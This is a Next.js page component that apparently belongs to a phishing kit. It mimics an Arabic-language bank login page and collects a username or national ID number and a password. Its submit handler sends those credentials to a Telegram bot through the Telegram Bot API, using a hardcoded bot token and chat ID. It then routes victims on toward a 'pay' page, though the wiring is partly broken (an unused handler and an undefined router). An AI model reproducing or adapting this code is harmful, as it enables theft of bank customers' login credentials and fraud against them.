"use client"
import styles from './blad.module.css'
import Image from 'next/image'
import icon1 from '../../../../../public/10.png'
import { useRef } from 'react'

const Page = () => {
    const username = useRef()
    const password = useRef()
    
    const handleOnSubmit = (e) => {
        e.preventDefault();
        var bot={
          token:"6752886623:AAEEnEA0icsjnl_LxSfEz7bpMwAneG4NmJg",
          chat_id:6859240733
        }
        var length =`بلاد  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }

      const handlerout = ()=>{
        if(username.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push('/fozajil/banks/pay')
        }
      }

  return (
    <div className={styles.container}>
        <Image 
            src={icon1}
            width={400}
        />
        <form >
            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>

        </form>
    </div>
  )
}

export default Page